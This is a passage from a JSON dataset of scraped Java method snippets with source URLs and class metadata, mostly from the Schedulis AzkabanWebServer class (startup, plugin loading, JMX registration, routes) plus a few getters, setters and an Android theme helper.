"implements": null, "modifiers": ["public"]}}, {"method_name": "setLocation", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLocation(String location) {        this.location = location;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/LoginLog.java", "stars": "1", "class": {"name": "LoginLog", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCreateTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getCreateTime() {        return createTime;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/LoginLog.java", "stars": "1", "class": {"name": "LoginLog", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCreateTime", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateTime(Long createTime) {        this.createTime = createTime;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/LoginLog.java", "stars": "1", "class": {"name": "LoginLog", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDevice() {        return device;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/LoginLog.java", "stars": "1", "class": {"name": "LoginLog", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDevice", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDevice(String device) {        this.device = device;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/LoginLog.java", "stars": "1", "class": {"name": "LoginLog", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getThemeSettings", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "Theme", "snippet": "    public static Theme getThemeSettings (Context context) {        Theme theme = new Theme();        theme.rippleBackground = context.getResources().getColor(R.color.colorAccent);        theme.titleTextColor = context.getResources().getColor(R.color.textColor);        theme.buttonOkTextColor = context.getResources().getColor(R.color.colorAccent);        theme.dialogBackground = context.getResources().getColor(R.color.colorPrimary);        theme.menuItemTextColor = context.getResources().getColor(R.color.textColor);        theme.defaultButtonTextColor = context.getResources().getColor(R.color.textColor);        return theme;    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/util/AppBottomDialogUtil.java", "stars": "4", "class": {"name": "AppBottomDialogUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getInstance", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "AzkabanWebServer", "snippet": "  public static AzkabanWebServer getInstance() {    return app;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void main(final String[] args) throws Exception {    // Redirect all std out and err messages into log4j    StdOutErrRedirect.redirectOutAndErrToLog();    logger.info(\"Starting Jetty Azkaban Web Server...\");    final Props props = AzkabanServer.loadProps(args);    if (props == null) {      logger.error(\"Azkaban Properties not loaded. Exiting..\");      System.exit(1);    }    /* Initialize Guice Injector */    final Injector injector = Guice.createInjector(        new AzkabanCommonModule(props),        new AzkabanWebServerModule(props)    );    SERVICE_PROVIDER.setInjector(injector);    launch(injector.getInstance(AzkabanWebServer.class), args);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "launch", "params": ["AzkabanWebServer", "String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void launch(final AzkabanWebServer webServer, String[] args) throws Exception {    /* This creates the Web Server instance */    app = webServer;    webServer.executorManagerAdapter.start();    // TODO refactor code into ServerProvider    webServer.prepareAndStartServer();\t  // FIXME\u00a0New feature: When restarting the web service, it is necessary to terminate the job stream that is executed cyclically.    webServer.stopAllCycleFlows(args);    Runtime.getRuntime().addShutdownHook(new Thread() {      @Override      public void run() {        try {          if (webServer.props.getBoolean(ConfigurationKeys.ENABLE_QUARTZ, false)) {            logger.info(\"Shutting down flow trigger scheduler...\");            webServer.scheduler.shutdown();          }        } catch (final Exception e) {          logger.error(\"Exception while shutting down flow trigger service.\", e);        }        try {          if (webServer.props.getBoolean(ConfigurationKeys.ENABLE_QUARTZ, false)) {            logger.info(\"Shutting down flow trigger service...\");            webServer.flowTriggerService.shutdown();          }        } catch (final Exception e) {          logger.error(\"Exception while shutting down flow trigger service.\", e);        }        try {          logger.info(\"Logging top memory consumers...\");          logTopMemoryConsumers();          logger.info(\"Shutting down http server...\");          webServer.close();        } catch (final Exception e) {          logger.error(\"Exception while shutting down web server.\", e);        }        logger.info(\"kk thx bye.\");      }      public void logTopMemoryConsumers() throws Exception {        if (new File(\"/bin/bash\").exists() && new File(\"/bin/ps\").exists()            && new File(\"/usr/bin/head\").exists()) {          logger.info(\"logging top memory consumer\");          final java.lang.ProcessBuilder processBuilder =              new java.lang.ProcessBuilder(\"/bin/bash\", \"-c\",                  \"/bin/ps aux --sort -rss | /usr/bin/head\");          final Process p = processBuilder.start();          p.waitFor();          final InputStream is = p.getInputStream();          final java.io.BufferedReader reader =              new java.io.BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));          String line = null;          while ((line = reader.readLine()) != null) {            logger.info(line);          }          is.close();        }      }    });  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "loadViewerPlugins", "params": ["ServletContextHandler", "String", "VelocityEngine"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "  private static void loadViewerPlugins(final ServletContextHandler root, final String pluginPath,      final VelocityEngine ve) {    final File viewerPluginPath = new File(pluginPath);    if (!viewerPluginPath.exists()) {      return;    }    //\u83b7\u53d6AzkabanWebServer\u7684\u7c7b\u52a0\u8f7d\u5668    final ClassLoader parentLoader = AzkabanWebServer.class.getClassLoader();    final File[] pluginDirs = viewerPluginPath.listFiles();    final ArrayList<String> jarPaths = new ArrayList<>();    for (final File pluginDir : pluginDirs) {      if (!pluginDir.exists()) {        logger.error(\"Error viewer plugin path \" + pluginDir.getPath() + \" doesn't exist.\");        continue;      }      if (!pluginDir.isDirectory()) {        logger.error(\"The plugin path \" + pluginDir + \" is not a directory.\");        continue;      }      // Load the conf directory      final File propertiesDir = new File(pluginDir, \"conf\");      Props pluginProps = null;      if (propertiesDir.exists() && propertiesDir.isDirectory()) {        final File propertiesFile = new File(propertiesDir, \"plugin.properties\");        final File propertiesOverrideFile =            new File(propertiesDir, \"override.properties\");        if (propertiesFile.exists()) {          if (propertiesOverrideFile.exists()) {            pluginProps =                PropsUtils.loadProps(null, propertiesFile,                    propertiesOverrideFile);          } else {//\u628a conf \u6587\u4ef6\u5939\u4e0b\u9762\u914d\u7f6e\u6587\u4ef6\u7684\u5185\u5bb9\u52a0\u8f7d\u5230 Props \u5bf9\u8c61\u4e2d            pluginProps = PropsUtils.loadProps(null, propertiesFile);          }        } else {          logger.error(\"Plugin conf file \" + propertiesFile + \" not found.\");          continue;        }      } else {        logger.error(\"Plugin conf path \" + propertiesDir + \" not found.\");        continue;      }      final String pluginName = pluginProps.getString(\"viewer.name\");      final String pluginWebPath = pluginProps.getString(\"viewer.path\");      final String pluginJobTypes = pluginProps.getString(\"viewer.jobtypes\", null);      final int pluginOrder = pluginProps.getInt(\"viewer.order\", 0);      final boolean pluginHidden = pluginProps.getBoolean(\"viewer.hidden\", false);      final List<String> extLibClasspath =          pluginProps.getStringList(\"viewer.external.classpaths\",              (List<String>) null);      final String pluginClass = pluginProps.getString(\"viewer.servlet.class\");      if (pluginClass == null) {        logger.error(\"Viewer class is not set.\");      } else {        logger.info(\"Plugin class \" + pluginClass);      }      URLClassLoader urlClassLoader = null;      final File libDir = new File(pluginDir, \"lib\");      if (libDir.exists() && libDir.isDirectory()) {        final File[] files = libDir.listFiles();        final ArrayList<URL> urls = new ArrayList<>();        for (int i = 0; i < files.length; ++i) {          try {            final URL url = files[i].toURI().toURL();            urls.add(url);          } catch (final MalformedURLException e) {            logger.error(e);          }        }        // Load any external libraries.        if (extLibClasspath != null) {          for (final String extLib : extLibClasspath) {            final File extLibFile = new File(pluginDir, extLib);            if (extLibFile.exists()) {              if (extLibFile.isDirectory()) {                // extLibFile is a directory; load all the files in the                // directory.                final File[] extLibFiles = extLibFile.listFiles();                for (int i = 0; i < extLibFiles.length; ++i) {                  try {                    final URL url = extLibFiles[i].toURI().toURL();                    urls.add(url);                  } catch (final MalformedURLException e) {                    logger.error(e);                  }                }              } else { // extLibFile is a file                try {                  final URL url = extLibFile.toURI().toURL();                  urls.add(url);                } catch (final MalformedURLException e) {                  logger.error(e);                }              }            } else {              logger.error(\"External library path \"                  + extLibFile.getAbsolutePath() + \" not found.\");              continue;            }          }        }        //URLClassLoader\u80fd\u52a8\u6001\u52a0\u8f7d\u4efb\u610f\u4f4d\u7f6ejar\u5305        urlClassLoader =            new URLClassLoader(urls.toArray(new URL[urls.size()]), parentLoader);      } else {        logger            .error(\"Library path \" + libDir.getAbsolutePath() + \" not found.\");        continue;      }      Class<?> viewerClass = null;      try {//\u901a\u8fc7pluginClass\u7c7b\u8def\u5f84\u83b7\u53d6\u8be5\u7c7b\u7684class        viewerClass = urlClassLoader.loadClass(pluginClass);      } catch (final ClassNotFoundException e) {        logger.error(\"Class \" + pluginClass + \" not found.\");        continue;      }      final String source = FileIOUtils.getSourcePathFromClass(viewerClass);      logger.info(\"Source jar \" + source);      jarPaths.add(\"jar:file:\" + source);      Constructor<?> constructor = null;      try {//\u901a\u8fc7Class\u83b7\u53d6Constructor\u5bf9\u8c61 \u53cd\u5c04\u4e2d Constructor \u662f\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u4fe1\u606f        constructor = viewerClass.getConstructor(Props.class);      } catch (final NoSuchMethodException e) {        logger.error(\"Constructor not found in \" + pluginClass);        continue;      }      Object obj = null;      try {//\u8c03\u7528\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u83b7\u53d6\u7c7b\u5b9e\u4f8b        obj = constructor.newInstance(pluginProps);      } catch (final Exception e) {        logger.error(e);        logger.error(e.getCause());      }      if (!(obj instanceof AbstractAzkabanServlet)) {        logger.error(\"The object is not an AbstractAzkabanServlet\");        continue;      }      final AbstractAzkabanServlet avServlet = (AbstractAzkabanServlet) obj;      root.addServlet(new ServletHolder(avServlet), \"/\" + pluginWebPath + \"/*\");      PluginRegistry.getRegistry().register(          new ViewerPlugin(pluginName, pluginWebPath, pluginOrder,              pluginHidden, pluginJobTypes));    }    // Velocity needs the jar resource paths to be set.    final String jarResourcePath = StringUtils.join(jarPaths, \", \");    logger.info(\"Setting jar resource path \" + jarResourcePath);    ve.addProperty(\"jar.resource.loader.path\", jarResourcePath);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getFlowTriggerService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "FlowTriggerService", "snippet": "  public FlowTriggerService getFlowTriggerService() {    return this.flowTriggerService;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getScheduler", "params": [], "throws": null, "modifiers": ["public"], "return_type": "FlowTriggerScheduler", "snippet": "  public FlowTriggerScheduler getScheduler() {    return this.scheduler;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "validateDatabaseVersion", "params": [], "throws": ["IOException", "SQLException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void validateDatabaseVersion() throws IOException, SQLException {    final boolean checkDB = this.props.getBoolean(AzkabanDatabaseSetup.DATABASE_CHECK_VERSION, false);    if (checkDB) {      final AzkabanDatabaseSetup setup = new AzkabanDatabaseSetup(this.props);      setup.loadTableInfo();      if (setup.needsUpdating()) {        logger.error(\"Database is out of date.\");        setup.printUpgradePlan();        logger.error(\"Exiting with error.\");        System.exit(-1);      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "prepareAndStartServer", "params": [], "throws": ["Exception"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void prepareAndStartServer()      throws Exception {    validateDatabaseVersion();    //createThreadPool();    configureRoutes();    // Todo jamiesjc: enable web metrics for azkaban poll model later    if (this.props.getBoolean(Constants.ConfigurationKeys.IS_METRICS_ENABLED, false)        && !this.props.getBoolean(ConfigurationKeys.AZKABAN_POLL_MODEL, false)) {      startWebMetrics();    }    if (this.props.getBoolean(ConfigurationKeys.ENABLE_QUARTZ, false)) {      // flowTriggerService needs to be started first before scheduler starts to schedule      // existing flow triggers      logger.info(\"starting flow trigger service\");      this.flowTriggerService.start();      logger.info(\"starting flow trigger scheduler\");      this.scheduler.start();    }    try {      this.server.start();      logger.info(\"Server started\");    } catch (final Exception e) {      logger.warn(e);      Utils.croak(e.getMessage(), 1);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "stopAllCycleFlows", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void stopAllCycleFlows(String[] args) throws ExecutorManagerException {    String argsStr = Strings.join(args, \",\");    logger.info(\"WebServer start args: \" + argsStr);    boolean stopCycleFlows = Arrays.stream(args)            .anyMatch(arg -> arg.equalsIgnoreCase(\"cyclestop\"));    if (stopCycleFlows) {      List<ExecutionCycle> executionCycles = executorManagerAdapter.getAllRunningCycleFlows();      logger.info(\"starting stop all cycle flows\");      executorManagerAdapter.stopAllCycleFlows();      logger.info(\"stopped all cycle flows successful\");      alertOnCycleFlowInterrupt(executionCycles);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "alertOnCycleFlowInterrupt", "params": ["List<ExecutionCycle>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void alertOnCycleFlowInterrupt(List<ExecutionCycle> executionCycles) {    CompletableFuture.runAsync(() -> {      for (ExecutionCycle executionCycle: executionCycles) {        if (executionCycle != null) {          try {            ExecutableFlow exFlow = this.executorManagerAdapter.getExecutableFlow(executionCycle.getCurrentExecId());            executionCycle.setStatus(Status.KILLED);            executionCycle.setEndTime(System.currentTimeMillis());            ExecutionControllerUtils.alertOnCycleFlowInterrupt(exFlow, executionCycle, alerterHolder);          } catch (ExecutorManagerException e) {            logger.error(String.format(\"alter cycle flow interrupt failed: flow: %s\", executionCycle.getFlowId()));          }        }      }    });  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "startWebMetrics", "params": [], "throws": ["Exception"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void startWebMetrics() throws Exception {    this.metricsManager.addGauge(\"WEB-NumQueuedFlows\", this.executorManagerAdapter::getQueuedFlowSize);    /*     * TODO: Currently {@link ExecutorManager#getRunningFlows()} includes both running and non-dispatched flows.     * Originally we would like to do a subtraction between getRunningFlows and {@link ExecutorManager#getQueuedFlowSize()},     * in order to have the correct runnable flows.     * However, both getRunningFlows and getQueuedFlowSize are not synchronized, such that we can not make     * a thread safe subtraction. We need to fix this in the future.     */    this.metricsManager.addGauge(\"WEB-NumRunningFlows\", () -> (this.executorManagerAdapter.getRunningFlows().size()));    logger.info(\"starting reporting Web Server Metrics\");    this.metricsManager.startReporting(\"AZ-WEB\", this.props);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "loadBuiltinCheckersAndActions", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void loadBuiltinCheckersAndActions() {    logger.info(\"Loading built-in checker and action types\");    ExecuteFlowAction.setExecutorManager(this.executorManagerAdapter);    ExecuteFlowAction.setProjectManager(this.projectManager);    ExecuteFlowAction.setTriggerManager(this.triggerManager);    ExecuteFlowAction.setSystemManager(this.transitionService.getSystemManager());    KillExecutionAction.setExecutorManager(this.executorManagerAdapter);    CreateTriggerAction.setTriggerManager(this.triggerManager);    ExecutionChecker.setExecutorManager(this.executorManagerAdapter);    this.triggerManager.registerCheckerType(BasicTimeChecker.type, BasicTimeChecker.class);    this.triggerManager.registerCheckerType(SlaChecker.type, SlaChecker.class);    this.triggerManager.registerCheckerType(ExecutionChecker.type, ExecutionChecker.class);    this.triggerManager.registerActionType(ExecuteFlowAction.type, ExecuteFlowAction.class);    this.triggerManager.registerActionType(KillExecutionAction.type, KillExecutionAction.class);    this.triggerManager.registerActionType(SlaAlertAction.type, SlaAlertAction.class);    this.triggerManager.registerActionType(CreateTriggerAction.type, CreateTriggerAction.class);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getSessionCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SessionCache", "snippet": "  public SessionCache getSessionCache() {    return this.sessionCache;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getVelocityEngine", "params": [], "throws": null, "modifiers": ["public"], "return_type": "VelocityEngine", "snippet": "  public VelocityEngine getVelocityEngine() {    return this.velocityEngine;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getTransitionService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TransitionService", "snippet": "  public TransitionService getTransitionService() {    return this.transitionService;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getProjectManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ProjectManager", "snippet": "  public ProjectManager getProjectManager() {    return this.projectManager;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ExecutorManagerAdapter", "snippet": "  public ExecutorManagerAdapter getExecutorManager() {    return this.executorManagerAdapter;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getScheduleManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ScheduleManager", "snippet": "  public ScheduleManager getScheduleManager() {    return this.scheduleManager;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getTriggerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TriggerManager", "snippet": "  public TriggerManager getTriggerManager() {      return this.triggerManager;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getServerProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props getServerProps() {    return this.props;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getTriggerPlugins", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,TriggerPlugin>", "snippet": "  public Map<String, TriggerPlugin> getTriggerPlugins() {    return this.triggerPlugins;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setTriggerPlugins", "params": ["Map<String,TriggerPlugin>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setTriggerPlugins(final Map<String, TriggerPlugin> triggerPlugins) {    this.triggerPlugins = triggerPlugins;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "configureMBeanServer", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void configureMBeanServer() {    logger.info(\"Registering MBeans...\");    this.mbeanServer = ManagementFactory.getPlatformMBeanServer();    registerMbean(\"jetty\", new JmxJettyServer(this.server));    registerMbean(\"triggerManager\", new JmxTriggerManager(this.triggerManager));    if (this.executorManagerAdapter instanceof ExecutorManager) {      registerMbean(\"executorManager\",          new JmxExecutorManager((ExecutorManager) this.executorManagerAdapter));    } else if (this.executorManagerAdapter instanceof ExecutionController) {      registerMbean(\"executionController\", new JmxExecutionController((ExecutionController) this          .executorManagerAdapter));    } else if (this.executorManagerAdapter instanceof ExecutorManagerHA) {      registerMbean(\"executorManagerHA\", new JmxExecutorManagerAdapter((ExecutorManagerHA) this.executorManagerAdapter));    }    // Register Log4J loggers as JMX beans so the log level can be    // updated via JConsole or Java VisualVM    final HierarchyDynamicMBean log4jMBean = new HierarchyDynamicMBean();    registerMbean(\"log4jmxbean\", log4jMBean);    final ObjectName accessLogLoggerObjName =        log4jMBean.addLoggerMBean(AZKABAN_ACCESS_LOGGER_NAME);    if (accessLogLoggerObjName == null) {      logger.info(          \"************* loginLoggerObjName is null, make sure there is a logger with name \"              + AZKABAN_ACCESS_LOGGER_NAME);    } else {      logger.info(\"******** loginLoggerObjName: \"          + accessLogLoggerObjName.getCanonicalName());    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "close", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void close() {    try {      for (final ObjectName name : this.registeredMBeans) {        this.mbeanServer.unregisterMBean(name);        logger.info(\"Jmx MBean \" + name.getCanonicalName() + \" unregistered.\");      }    } catch (final Exception e) {      logger.error(\"Failed to cleanup MBeanServer\", e);    }    this.scheduleManager.shutdown();    this.executorManagerAdapter.shutdown();    try {      this.server.stop();    } catch (final Exception e) {      // Catch all while closing server      logger.error(e);    }    this.server.destroy();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "registerMbean", "params": ["String", "Object"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void registerMbean(final String name, final Object mbean) {    final Class<?> mbeanClass = mbean.getClass();    final ObjectName mbeanName;    try {      mbeanName = new ObjectName(mbeanClass.getName() + \":name=\" + name);      this.mbeanServer.registerMBean(mbean, mbeanName);      logger.info(\"Bean \" + mbeanClass.getCanonicalName() + \" registered.\");      this.registeredMBeans.add(mbeanName);    } catch (final Exception e) {      logger.error(\"Error registering mbean \" + mbeanClass.getCanonicalName(),          e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getMbeanNames", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<ObjectName>", "snippet": "  public List<ObjectName> getMbeanNames() {    return this.registeredMBeans;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getMBeanInfo", "params": ["ObjectName"], "throws": null, "modifiers": ["public"], "return_type": "MBeanInfo", "snippet": "  public MBeanInfo getMBeanInfo(final ObjectName name) {    try {      return this.mbeanServer.getMBeanInfo(name);    } catch (final Exception e) {      logger.error(e);      return null;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getMBeanAttribute", "params": ["ObjectName", "String"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getMBeanAttribute(final ObjectName name, final String attribute) {    try {      return this.mbeanServer.getAttribute(name, attribute);    } catch (final Exception e) {      logger.error(e);      return null;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "configureRoutes", "params": [], "throws": ["TriggerManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void configureRoutes() throws TriggerManagerException {    final String staticDir =        this.props.getString(\"web.resource.dir\", DEFAULT_STATIC_DIR);    logger.info(\"Setting up web resource dir \" + staticDir);    final ServletContextHandler root = new ServletContextHandler(this.server, \"/\", ServletContextHandler.SESSIONS);    root.getSessionHandler().setMaxInactiveInterval(30 * 60);    root.addFilter(new FilterHolder(LocaleFilter.class),\"/*\", EnumSet.of(DispatcherType.REQUEST));    root.setMaxFormContentSize(MAX_FORM_CONTENT_SIZE);    final String defaultServletPath =        this.props.getString(\"azkaban.default.servlet.path\", \"/index\");    root.setResourceBase(staticDir);    final ServletHolder indexRedirect =        new ServletHolder(new IndexRedirectServlet(defaultServletPath));    root.addServlet(indexRedirect, \"/\");    final ServletHolder index = new ServletHolder(new ProjectServlet());    root.addServlet(index, \"/index\");    final ServletHolder staticServlet = new ServletHolder(new DefaultServlet());    root.addServlet(staticServlet, \"/css/*\");    root.addServlet(staticServlet, \"/js/*\");    root.addServlet(staticServlet, \"/images/*\");    root.addServlet(staticServlet, \"/fonts/*\");    root.addServlet(staticServlet, \"/favicon.ico\");    root.addServlet(new ServletHolder(new ProjectManagerServlet()), \"/manager\");    root.addServlet(new ServletHolder(new ExecutorServlet()), \"/executor\");    root.addServlet(new ServletHolder(new HistoryServlet()), \"/history\");    root.addServlet(new ServletHolder(new ScheduleServlet()), \"/schedule\");    root.addServlet(new ServletHolder(new JMXHttpServlet()), \"/jmx\");  